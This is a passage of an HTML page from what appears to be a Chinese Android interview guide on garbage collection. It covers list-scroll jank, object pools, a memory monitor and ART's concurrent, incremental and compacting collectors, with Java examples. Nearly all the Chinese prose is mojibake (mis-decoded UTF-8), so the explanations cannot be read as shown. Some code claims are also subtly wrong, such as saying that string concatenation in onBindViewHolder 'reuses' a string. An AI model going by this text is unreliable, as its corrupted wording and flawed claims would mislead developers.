<li>ä½¿ç”¨Systraceåˆ†æå¡é¡¿</li>
<li>æŸ¥çœ‹GCäº‹ä»¶æ˜¯å¦ä¸å¡é¡¿æ—¶é—´å¯¹åº”</li>
<li>å¦‚æœå¯¹åº”ï¼Œè¯´æ˜GCå¯¼è‡´äº†å¡é¡¿</li>
</ul>
<p><strong>3. æ‰¾å‡ºé¢‘ç¹åˆ›å»ºå¯¹è±¡çš„åœ°æ–¹</strong></p>
<ul>
<li>ä½¿ç”¨Profilerçš„"Allocation Tracking"åŠŸèƒ½</li>
<li>æŸ¥çœ‹å“ªäº›å¯¹è±¡è¢«é¢‘ç¹åˆ†é…</li>
<li>åˆ†æä»£ç ï¼Œæ‰¾å‡ºé¢‘ç¹åˆ›å»ºå¯¹è±¡çš„åœ°æ–¹</li>
</ul>
<p><strong>4. ä¼˜åŒ–ä»£ç å‡å°‘GC</strong></p>
<ul>
<li>æ ¹æ®åˆ†æç»“æœï¼Œä¼˜åŒ–ä»£ç ï¼š
<ul>
<li>ä½¿ç”¨å¯¹è±¡æ± å¤ç”¨å¯¹è±¡</li>
<li>é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</li>
<li>ä½¿ç”¨åŸºæœ¬ç±»å‹æ›¿ä»£åŒ…è£…ç±»å‹</li>
<li>ä¿®å¤å†…å­˜æ³„æ¼</li>
</ul>
</li>
</ul>
<p><strong>ä¼˜åŒ–æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li><strong>å‡å°‘å¯¹è±¡åˆ›å»º</strong>ï¼šä½¿ç”¨å¯¹è±¡æ± ã€é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</li>
<li><strong>é¿å…è§¦å‘Full GC</strong>ï¼šé¿å…å†…å­˜æ³„æ¼ã€å‡å°‘è€å¹´ä»£å¯¹è±¡</li>
<li><strong>ä¼˜åŒ–åˆ—è¡¨æ»‘åŠ¨</strong>ï¼šViewHolderå¤ç”¨ã€é¿å…åœ¨onBindViewHolderä¸­åˆ›å»ºå¯¹è±¡</li>
</ul>
<p><strong>5. å¦‚ä½•æ’æŸ¥åˆ—è¡¨æ»‘åŠ¨å¡é¡¿é—®é¢˜ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>æ’æŸ¥æµç¨‹ï¼š</strong></p>
<p><strong>1. æ£€æŸ¥ViewHolderå¤ç”¨</strong></p>
<ul>
<li>ç¡®ä¿RecyclerViewçš„ViewHolderæ­£ç¡®å¤ç”¨</li>
<li>æ£€æŸ¥Adapterçš„å®ç°æ˜¯å¦æ­£ç¡®</li>
<li>ç¡®ä¿ViewHolderä¸ä¼šè¢«é¢‘ç¹åˆ›å»º</li>
</ul>
<p><strong>2. é¿å…åœ¨onBindViewHolderä¸­åˆ›å»ºå¯¹è±¡</strong></p>
<ul>
<li>onBindViewHolderåœ¨æ»‘åŠ¨æ—¶é¢‘ç¹è°ƒç”¨</li>
<li>ä¸è¦åœ¨è¿™é‡Œåˆ›å»ºæ–°å¯¹è±¡</li>
<li>å¤ç”¨å­—ç¬¦ä¸²ã€é¿å…åˆ›å»ºä¸´æ—¶å¯¹è±¡</li>
</ul>
<p><strong>3. ä½¿ç”¨å¯¹è±¡æ± </strong></p>
<ul>
<li>å¯¹äºéœ€è¦é¢‘ç¹åˆ›å»ºçš„å¯¹è±¡ï¼Œä½¿ç”¨å¯¹è±¡æ± </li>
<li>ç¤ºä¾‹ï¼šè‡ªå®šä¹‰å¯¹è±¡æ± ç®¡ç†å¯¹è±¡å¤ç”¨</li>
</ul>
<p><strong>4. å‡å°‘GC</strong></p>
<ul>
<li>é€šè¿‡ä»¥ä¸Šæ–¹æ³•å‡å°‘å¯¹è±¡åˆ›å»º</li>
<li>å‡å°‘GCé¢‘ç‡ï¼Œè®©åˆ—è¡¨æ»‘åŠ¨æ›´æµç•…</li>
</ul>
<p><strong>5. ä½¿ç”¨Systraceåˆ†æ</strong></p>
<ul>
<li>ä½¿ç”¨Systraceåˆ†æå¡é¡¿</li>
<li>æŸ¥çœ‹GCäº‹ä»¶æ˜¯å¦ä¸å¡é¡¿å¯¹åº”</li>
<li>å¦‚æœå¯¹åº”ï¼Œä¼˜åŒ–GC</li>
</ul>
<p><strong>ä¼˜åŒ–ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šå¯¼è‡´å¡é¡¿</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onBindViewHolder</span><span class="hljs-params">(ViewHolder holder, <span class="hljs-type">int</span> position)</span> {
    holder.textView.setText(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">"Item "</span> + position));  <span class="hljs-comment">// åˆ›å»ºæ–°å¯¹è±¡</span>
    holder.imageView.setImageBitmap(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Bitmap</span>());  <span class="hljs-comment">// åˆ›å»ºæ–°å¯¹è±¡</span>
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šé¿å…å¡é¡¿</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onBindViewHolder</span><span class="hljs-params">(ViewHolder holder, <span class="hljs-type">int</span> position)</span> {
    holder.textView.setText(<span class="hljs-string">"Item "</span> + position);  <span class="hljs-comment">// å¤ç”¨å­—ç¬¦ä¸²</span>
    <span class="hljs-comment">// ä½¿ç”¨å›¾ç‰‡ç¼“å­˜ï¼Œé¿å…é¢‘ç¹åˆ›å»ºBitmap</span>
    Glide.with(context).load(url).into(holder.imageView);
}
</code></pre>
<h4 data-id="heading-86">6.3.2 è®¾è®¡é¢˜</h4>
<p><strong>1. å¦‚ä½•è®¾è®¡ä¸€ä¸ªå¯¹è±¡æ± ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>å¯¹è±¡æ± çš„æ ¸å¿ƒæ˜¯<strong>å¤ç”¨å¯¹è±¡</strong>ï¼Œé¿å…é¢‘ç¹åˆ›å»ºå’Œé”€æ¯ã€‚</p>
<p><strong>è®¾è®¡è¦ç‚¹ï¼š</strong></p>
<p><strong>1. å®šä¹‰å¯¹è±¡æ± æ¥å£</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ObjectPool</span>&lt;T&gt; {
    T <span class="hljs-title function_">acquire</span><span class="hljs-params">()</span>;        <span class="hljs-comment">// è·å–å¯¹è±¡</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">release</span><span class="hljs-params">(T obj)</span>; <span class="hljs-comment">// å½’è¿˜å¯¹è±¡</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">clear</span><span class="hljs-params">()</span>;       <span class="hljs-comment">// æ¸…ç©ºæ± </span>
}
</code></pre>
<p><strong>2. å®ç°å¯¹è±¡å¤ç”¨é€»è¾‘</strong></p>
<ul>
<li>ä½¿ç”¨é˜Ÿåˆ—ï¼ˆQueueï¼‰å­˜å‚¨å¯å¤ç”¨çš„å¯¹è±¡</li>
<li>è·å–æ—¶ä»é˜Ÿåˆ—ä¸­å–å‡ºï¼Œå½’è¿˜æ—¶æ”¾å›é˜Ÿåˆ—</li>
<li>å¦‚æœé˜Ÿåˆ—ä¸ºç©ºï¼Œåˆ›å»ºæ–°å¯¹è±¡</li>
</ul>
<p><strong>3. è®¾ç½®æ± å¤§å°é™åˆ¶</strong></p>
<ul>
<li>é¿å…æ± æ— é™å¢é•¿</li>
<li>è®¾ç½®æœ€å¤§æ± å¤§å°</li>
<li>è¶…è¿‡å¤§å°æ—¶ï¼Œä¸å†å½’è¿˜å¯¹è±¡</li>
</ul>
<p><strong>4. æä¾›è·å–å’Œå½’è¿˜æ–¹æ³•</strong></p>
<ul>
<li>acquire()ï¼šä»æ± ä¸­è·å–å¯¹è±¡ï¼Œå¦‚æœæ± ä¸ºç©ºåˆ™åˆ›å»ºæ–°å¯¹è±¡</li>
<li>release()ï¼šå½’è¿˜å¯¹è±¡åˆ°æ± ä¸­ï¼Œå¦‚æœæ± å·²æ»¡åˆ™ä¸å½’è¿˜</li>
<li>clear()ï¼šæ¸…ç©ºæ± ï¼Œé‡Šæ”¾æ‰€æœ‰å¯¹è±¡</li>
</ul>
<p><strong>å®Œæ•´å®ç°ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleObjectPool</span>&lt;T&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPool</span>&lt;T&gt; {
    <span class="hljs-keyword">private</span> Queue&lt;T&gt; pool = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> maxSize;
    <span class="hljs-keyword">private</span> Supplier&lt;T&gt; factory;  <span class="hljs-comment">// å¯¹è±¡å·¥å‚</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SimpleObjectPool</span><span class="hljs-params">(<span class="hljs-type">int</span> maxSize, Supplier&lt;T&gt; factory)</span> {
        <span class="hljs-built_in">this</span>.maxSize = maxSize;
        <span class="hljs-built_in">this</span>.factory = factory;
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">acquire</span><span class="hljs-params">()</span> {
        <span class="hljs-type">T</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> pool.poll();
        <span class="hljs-keyword">if</span> (obj == <span class="hljs-literal">null</span>) {
            obj = factory.get();  <span class="hljs-comment">// æ± ä¸ºç©ºæ—¶åˆ›å»ºæ–°å¯¹è±¡</span>
        }
        <span class="hljs-keyword">return</span> obj;
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">release</span><span class="hljs-params">(T obj)</span> {
        <span class="hljs-keyword">if</span> (obj != <span class="hljs-literal">null</span> &amp;&amp; pool.size() &lt; maxSize) {
            resetObject(obj);  <span class="hljs-comment">// é‡ç½®å¯¹è±¡çŠ¶æ€</span>
            pool.offer(obj);   <span class="hljs-comment">// å½’è¿˜åˆ°æ± ä¸­</span>
        }
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">clear</span><span class="hljs-params">()</span> {
        pool.clear();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resetObject</span><span class="hljs-params">(T obj)</span> {
        <span class="hljs-comment">// é‡ç½®å¯¹è±¡çŠ¶æ€ï¼Œå‡†å¤‡å¤ç”¨</span>
    }
}
</code></pre>
<p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>é¢‘ç¹åˆ›å»ºçš„å¯¹è±¡ï¼ˆå¦‚åŠ¨ç”»å¯¹è±¡ã€ä¸´æ—¶å¯¹è±¡ï¼‰</li>
<li>åˆ›å»ºæˆæœ¬é«˜çš„å¯¹è±¡ï¼ˆå¦‚Bitmapã€å¤§å¯¹è±¡ï¼‰</li>
</ul>
<p><strong>2. å¦‚ä½•è®¾è®¡ä¸€ä¸ªå†…å­˜ç›‘æ§ç³»ç»Ÿï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>å†…å­˜ç›‘æ§ç³»ç»Ÿéœ€è¦å®æ—¶ç›‘æ§å†…å­˜ä½¿ç”¨æƒ…å†µï¼ŒåŠæ—¶å‘ç°é—®é¢˜ã€‚</p>
<p><strong>è®¾è®¡è¦ç‚¹ï¼š</strong></p>
<p><strong>1. å®æ—¶ç›‘æ§å†…å­˜ä½¿ç”¨</strong></p>
<ul>
<li>ä½¿ç”¨Runtime.getRuntime()è·å–å†…å­˜ä¿¡æ¯</li>
<li>å®šæœŸé‡‡é›†å†…å­˜ä½¿ç”¨æ•°æ®</li>
<li>è®°å½•å†…å­˜ä½¿ç”¨æ›²çº¿</li>
</ul>
<p><strong>2. è®°å½•GCäº‹ä»¶</strong></p>
<ul>
<li>ç›‘å¬GCäº‹ä»¶ï¼ˆé€šè¿‡GCæ—¥å¿—æˆ–Profilerï¼‰</li>
<li>è®°å½•GCç±»å‹ã€GCè€—æ—¶ã€GCé¢‘ç‡</li>
<li>åˆ†æGCå¯¹æ€§èƒ½çš„å½±å“</li>
</ul>
<p><strong>3. åˆ†æå†…å­˜è¶‹åŠ¿</strong></p>
<ul>
<li>åˆ†æå†…å­˜ä½¿ç”¨è¶‹åŠ¿</li>
<li>è¯†åˆ«å†…å­˜æ³„æ¼ï¼ˆå†…å­˜æŒç»­å¢é•¿ï¼‰</li>
<li>é¢„æµ‹OOMé£é™©</li>
</ul>
<p><strong>4. è®¾ç½®å‘Šè­¦é˜ˆå€¼</strong></p>
<ul>
<li>è®¾ç½®å†…å­˜ä½¿ç”¨å‘Šè­¦é˜ˆå€¼</li>
<li>è®¾ç½®GCé¢‘ç‡å‘Šè­¦é˜ˆå€¼</li>
<li>è¶…è¿‡é˜ˆå€¼æ—¶å‘é€å‘Šè­¦</li>
</ul>
<p><strong>å®ç°ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryMonitor</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">MEMORY_WARNING_THRESHOLD</span> <span class="hljs-operator">=</span> <span class="hljs-number">80</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>;  <span class="hljs-comment">// 80MB</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">GC_FREQUENCY_THRESHOLD</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;  <span class="hljs-comment">// æ¯ç§’10æ¬¡</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">monitor</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();
        <span class="hljs-type">long</span> <span class="hljs-variable">usedMemory</span> <span class="hljs-operator">=</span> runtime.totalMemory() - runtime.freeMemory();
        <span class="hljs-type">long</span> <span class="hljs-variable">maxMemory</span> <span class="hljs-operator">=</span> runtime.maxMemory();
        
        <span class="hljs-comment">// æ£€æŸ¥å†…å­˜ä½¿ç”¨</span>
        <span class="hljs-keyword">if</span> (usedMemory &gt; MEMORY_WARNING_THRESHOLD) {
            sendWarning(<span class="hljs-string">"å†…å­˜ä½¿ç”¨è¿‡é«˜: "</span> + usedMemory);
        }
        
        <span class="hljs-comment">// æ£€æŸ¥GCé¢‘ç‡</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">gcFrequency</span> <span class="hljs-operator">=</span> getGCFrequency();
        <span class="hljs-keyword">if</span> (gcFrequency &gt; GC_FREQUENCY_THRESHOLD) {
            sendWarning(<span class="hljs-string">"GCè¿‡äºé¢‘ç¹: "</span> + gcFrequency + <span class="hljs-string">"æ¬¡/ç§’"</span>);
        }
    }
}
</code></pre>
<p><strong>3. å¦‚ä½•è®¾è®¡ä¸€ä¸ªé«˜å†…å­˜æ•ˆç‡çš„Androidåº”ç”¨ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>é«˜å†…å­˜æ•ˆç‡çš„åº”ç”¨éœ€è¦ä»å¤šä¸ªæ–¹é¢ä¼˜åŒ–å†…å­˜ä½¿ç”¨ã€‚</p>
<p><strong>è®¾è®¡è¦ç‚¹ï¼š</strong></p>
<p><strong>1. å‡å°‘å¯¹è±¡åˆ›å»ºï¼ˆä½¿ç”¨å¯¹è±¡æ± ï¼‰</strong></p>
<ul>
<li>å¯¹äºé¢‘ç¹åˆ›å»ºçš„å¯¹è±¡ï¼Œä½¿ç”¨å¯¹è±¡æ± </li>
<li>å¤ç”¨å¯¹è±¡ï¼Œé¿å…é¢‘ç¹åˆ›å»ºé”€æ¯</li>
<li>ç¤ºä¾‹ï¼šåŠ¨ç”»å¯¹è±¡ã€ä¸´æ—¶å¯¹è±¡</li>
</ul>
<p><strong>2. é¿å…å†…å­˜æ³„æ¼ï¼ˆæ­£ç¡®ç®¡ç†ç”Ÿå‘½å‘¨æœŸï¼‰</strong></p>
<ul>
<li>æ­£ç¡®å¤„ç†Activityã€Fragmentçš„ç”Ÿå‘½å‘¨æœŸ</li>
<li>åœ¨onDestroyä¸­æ¸…ç†èµ„æº</li>
<li>ä½¿ç”¨å¼±å¼•ç”¨é¿å…å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>3. åˆç†ä½¿ç”¨ç¼“å­˜ï¼ˆLruCacheï¼‰</strong></p>
<ul>
<li>ä½¿ç”¨LruCacheç­‰æœ‰å¤§å°é™åˆ¶çš„ç¼“å­˜</li>
<li>åŠæ—¶æ¸…ç†ä¸éœ€è¦çš„ç¼“å­˜</li>
<li>é¿å…æ— é™åˆ¶ç¼“å­˜</li>
</ul>
<p><strong>4. åŠæ—¶é‡Šæ”¾èµ„æº</strong></p>
<ul>
<li>åŠæ—¶é‡Šæ”¾å¤§å¯¹è±¡ï¼ˆå¤§å›¾ç‰‡ã€å¤§æ•°ç»„ï¼‰</li>
<li>å…³é—­æ–‡ä»¶ã€æ•°æ®åº“è¿æ¥</li>
<li>æ¸…ç†é›†åˆã€å–æ¶ˆæ³¨å†Œç›‘å¬å™¨</li>
</ul>
<p><strong>5. ä¼˜åŒ–æ•°æ®ç»“æ„</strong></p>
<ul>
<li>é€‰æ‹©åˆé€‚çš„é›†åˆç±»</li>
<li>é¿å…å†…å­˜æµªè´¹</li>
<li>åŠæ—¶æ¸…ç†é›†åˆ</li>
</ul>
<p><strong>6. ç›‘æ§å’Œè°ƒä¼˜</strong></p>
<ul>
<li>ä½¿ç”¨Profilerç›‘æ§å†…å­˜ä½¿ç”¨</li>
<li>ä½¿ç”¨LeakCanaryæ£€æµ‹å†…å­˜æ³„æ¼</li>
<li>æ ¹æ®å®é™…æƒ…å†µä¼˜åŒ–</li>
</ul>
<p><strong>è®¾è®¡åŸåˆ™ï¼š</strong></p>
<ul>
<li><strong>æœ€å°åŒ–å¯¹è±¡åˆ›å»º</strong>ï¼šå‡å°‘å¯¹è±¡åˆ†é…ï¼Œå‡å°‘GC</li>
<li><strong>åŠæ—¶é‡Šæ”¾èµ„æº</strong>ï¼šé¿å…å†…å­˜æ³„æ¼ï¼Œé¿å…OOM</li>
<li><strong>åˆç†ä½¿ç”¨ç¼“å­˜</strong>ï¼šä½¿ç”¨æœ‰å¤§å°é™åˆ¶çš„ç¼“å­˜</li>
<li><strong>ç›‘æ§å’Œä¼˜åŒ–</strong>ï¼šæŒç»­ç›‘æ§ï¼ŒæŒç»­ä¼˜åŒ–</li>
</ul>
<h4 data-id="heading-87">6.3.3 æ·±å…¥åŸç†é¢˜ï¼ˆé«˜çº§ï¼‰</h4>
<p><strong>1. ARTå¹¶å‘å¤åˆ¶æ”¶é›†å™¨æ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>ARTå¹¶å‘å¤åˆ¶æ”¶é›†å™¨çš„å·¥ä½œæµç¨‹ï¼š</p>
<p><strong>1. å¹¶å‘æ ‡è®°ï¼ˆConcurrent Markingï¼‰</strong></p>
<ul>
<li>åœ¨åå°çº¿ç¨‹æ‰§è¡Œæ ‡è®°å·¥ä½œ</li>
<li>ä»GC Rootså¼€å§‹ï¼Œæ ‡è®°æ‰€æœ‰å­˜æ´»å¯¹è±¡</li>
<li>ä¸»çº¿ç¨‹ç»§ç»­è¿è¡Œï¼Œä¸æš‚åœ</li>
</ul>
<p><strong>2. å¹¶å‘å¤åˆ¶ï¼ˆConcurrent Copyingï¼‰</strong></p>
<ul>
<li>åœ¨åå°çº¿ç¨‹æ‰§è¡Œå¤åˆ¶å·¥ä½œ</li>
<li>å°†å­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°æ–°ä½ç½®</li>
<li>ä¸»çº¿ç¨‹ç»§ç»­è¿è¡Œï¼Œä¸æš‚åœ</li>
</ul>
<p><strong>3. å‡å°‘ä¸»çº¿ç¨‹æš‚åœæ—¶é—´</strong></p>
<ul>
<li>å¤§éƒ¨åˆ†å·¥ä½œåœ¨åå°çº¿ç¨‹æ‰§è¡Œ</li>
<li>ä¸»çº¿ç¨‹åªåœ¨å¿…è¦æ—¶çŸ­æš‚æš‚åœ</li>
<li>å‡å°‘å¡é¡¿ï¼Œæå‡ç”¨æˆ·ä½“éªŒ</li>
</ul>
<p><strong>4. é€‚åˆäº¤äº’å¼åº”ç”¨</strong></p>
<ul>
<li>Androidåº”ç”¨æ˜¯äº¤äº’å¼åº”ç”¨ï¼Œéœ€è¦ä½å»¶è¿Ÿ</li>
<li>å¹¶å‘å›æ”¶å‡å°‘æš‚åœæ—¶é—´ï¼Œé€‚åˆäº¤äº’å¼åº”ç”¨</li>
<li>ä¼˜åŒ–ç”¨æˆ·æ»‘åŠ¨ã€ç‚¹å‡»ç­‰æ“ä½œçš„æµç•…åº¦</li>
</ul>
<p><strong>å·¥ä½œæµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> è§¦å‘GC
<span class="hljs-bullet">2.</span> åå°çº¿ç¨‹ï¼šå¹¶å‘æ ‡è®°å­˜æ´»å¯¹è±¡
<span class="hljs-bullet">3.</span> åå°çº¿ç¨‹ï¼šå¹¶å‘å¤åˆ¶å­˜æ´»å¯¹è±¡
<span class="hljs-bullet">4.</span> ä¸»çº¿ç¨‹ï¼šçŸ­æš‚æš‚åœï¼Œå®Œæˆæœ€åçš„åŒæ­¥å·¥ä½œ
<span class="hljs-bullet">5.</span> ä¸»çº¿ç¨‹ï¼šç»§ç»­è¿è¡Œ
</code></pre>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>å‡å°‘ä¸»çº¿ç¨‹æš‚åœæ—¶é—´</li>
<li>æå‡åº”ç”¨æµç•…åº¦</li>
<li>é€‚åˆäº¤äº’å¼åº”ç”¨</li>
</ul>
<p><strong>2. å¢é‡å›æ”¶æ˜¯å¦‚ä½•å‡å°‘å¡é¡¿çš„ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>å¢é‡å›æ”¶çš„æ ¸å¿ƒæ€æƒ³æ˜¯<strong>æŠŠå¤§é‡å›æ”¶å·¥ä½œåˆ†æˆå°ä»½ï¼Œåˆ†æ‰¹æ‰§è¡Œ</strong>ã€‚</p>
<p><strong>å·¥ä½œåŸç†ï¼š</strong></p>
<p><strong>1. åˆ†æ‰¹æ‰§è¡Œ</strong></p>
<ul>
<li>æŠŠå¤§é‡å›æ”¶å·¥ä½œåˆ†æˆå¤šä¸ªå°ä»»åŠ¡</li>
<li>æ¯æ¬¡åªæ‰§è¡Œä¸€å°éƒ¨åˆ†</li>
<li>é¿å…ä¸€æ¬¡æ€§æ‰§è¡Œæ‰€æœ‰å›æ”¶å·¥ä½œ</li>
</ul>
<p><strong>2. æ¯æ¬¡æš‚åœæ—¶é—´çŸ­</strong></p>
<ul>
<li>æ¯æ¬¡åªæ‰§è¡Œä¸€å°éƒ¨åˆ†ï¼Œæš‚åœæ—¶é—´çŸ­</li>
<li>ç”¨æˆ·å‡ ä¹æ„Ÿè§‰ä¸åˆ°å¡é¡¿</li>
<li>å¤šæ¬¡çŸ­æš‚åœæ¯”ä¸€æ¬¡é•¿æš‚åœä½“éªŒæ›´å¥½</li>
</ul>
<p><strong>3. é¿å…ä¸€æ¬¡æ€§å¡é¡¿å¤ªä¹…</strong></p>
<ul>
<li>ä¼ ç»Ÿå›æ”¶ï¼šä¸€æ¬¡æ€§å›æ”¶æ‰€æœ‰å¯¹è±¡ï¼Œæš‚åœæ—¶é—´é•¿ï¼ˆå¯èƒ½50msï¼‰</li>
<li>å¢é‡å›æ”¶ï¼šåˆ†æˆå¤šæ¬¡ï¼Œæ¯æ¬¡æš‚åœæ—¶é—´çŸ­ï¼ˆå¯èƒ½5msï¼‰</li>
<li>ç”¨æˆ·æ„Ÿè§‰ï¼šå‡ ä¹æ„Ÿè§‰ä¸åˆ°</li>
</ul>
<p><strong>å¯¹æ¯”ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css">ä¼ ç»Ÿå›æ”¶ï¼š
<span class="hljs-selector-attr">[ä¸€æ¬¡æ€§å›æ”¶æ‰€æœ‰å¯¹è±¡]</span>
æš‚åœæ—¶é—´ï¼š<span class="hljs-number">50ms</span>
ç”¨æˆ·æ„Ÿè§‰ï¼šæ˜æ˜¾å¡é¡¿

å¢é‡å›æ”¶ï¼š
<span class="hljs-selector-attr">[å›æ”¶ä¸€ç‚¹]</span><span class="hljs-selector-attr">[å›æ”¶ä¸€ç‚¹]</span><span class="hljs-selector-attr">[å›æ”¶ä¸€ç‚¹]</span>
æ¯æ¬¡æš‚åœï¼š<span class="hljs-number">5ms</span>
ç”¨æˆ·æ„Ÿè§‰ï¼šå‡ ä¹æ„Ÿè§‰ä¸åˆ°
</code></pre>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>å‡å°‘å•æ¬¡æš‚åœæ—¶é—´</li>
<li>æå‡ç”¨æˆ·ä½“éªŒ</li>
<li>é€‚åˆäº¤äº’å¼åº”ç”¨</li>
</ul>
<p><strong>3. å‹ç¼©å›æ”¶æ˜¯å¦‚ä½•é¿å…å†…å­˜ç¢ç‰‡çš„ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>å‹ç¼©å›æ”¶çš„æ ¸å¿ƒæ˜¯<strong>å›æ”¶åæ•´ç†å†…å­˜ï¼ŒæŠŠåˆ†æ•£çš„å†…å­˜å—åˆå¹¶</strong>ã€‚</p>
<p><strong>å·¥ä½œåŸç†ï¼š</strong></p>
<p><strong>1. æ ‡è®°é˜¶æ®µ</strong></p>
<ul>
<li>æ ‡è®°æ‰€æœ‰éœ€è¦å›æ”¶çš„å¯¹è±¡</li>
<li>æ ‡è®°æ‰€æœ‰å­˜æ´»å¯¹è±¡</li>
</ul>
<p><strong>2. æ•´ç†é˜¶æ®µ</strong></p>
<ul>
<li>å°†å­˜æ´»å¯¹è±¡å‘ä¸€ç«¯ç§»åŠ¨</li>
<li>æŠŠåˆ†æ•£çš„å†…å­˜å—åˆå¹¶æˆè¿ç»­ç©ºé—´</li>
<li>æ›´æ–°æ‰€æœ‰å¯¹è±¡çš„å¼•ç”¨</li>
</ul>
<p><strong>3. æ¸…é™¤é˜¶æ®µ</strong></p>
<ul>
<li>æ¸…ç†è¾¹ç•Œå¤–çš„å†…å­˜</li>
<li>é‡Šæ”¾åƒåœ¾å¯¹è±¡å ç”¨çš„å†…å­˜</li>
</ul>
<p><strong>æ•ˆæœï¼š</strong></p>
<pre><code class="hljs language-css" lang="css">å‹ç¼©å‰ï¼š
<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[å¯¹è±¡2]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span>
å†…å­˜ç¢ç‰‡å¤šï¼Œåˆ†é…æ•ˆç‡ä½

å‹ç¼©åï¼š
<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[å¯¹è±¡2]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[ç©ºé—²]</span>
å†…å­˜è¿ç»­ï¼Œåˆ†é…æ•ˆç‡é«˜
</code></pre>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li><strong>æ²¡æœ‰å†…å­˜ç¢ç‰‡</strong>ï¼šæ•´ç†åå†…å­˜è¿ç»­</li>
<li><strong>æé«˜å†…å­˜åˆ©ç”¨ç‡</strong>ï¼šé¿å…å†…å­˜æµªè´¹</li>
<li><strong>æé«˜åˆ†é…æ•ˆç‡</strong>ï¼šè¿ç»­å†…å­˜åˆ†é…æ›´å¿«</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆè€å¹´ä»£ç”¨å‹ç¼©å›æ”¶ï¼Ÿ</strong></p>
<ul>
<li>è€å¹´ä»£å¯¹è±¡å­˜æ´»ç‡é«˜ï¼Œç§»åŠ¨æˆæœ¬ç›¸å¯¹è¾ƒä½</li>
<li>é¿å…å†…å­˜ç¢ç‰‡ï¼Œæé«˜å†…å­˜åˆ©ç”¨ç‡</li>
<li>ä¸æµªè´¹å†…å­˜ï¼ˆä¸åƒæ ‡è®°-å¤åˆ¶éœ€è¦ä¸¤å—å†…å­˜ï¼‰</li>
</ul>
<p><strong>4. ä¸ºä»€ä¹ˆAndroidåªç”¨ä¸€ç§åƒåœ¾å›æ”¶å™¨ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
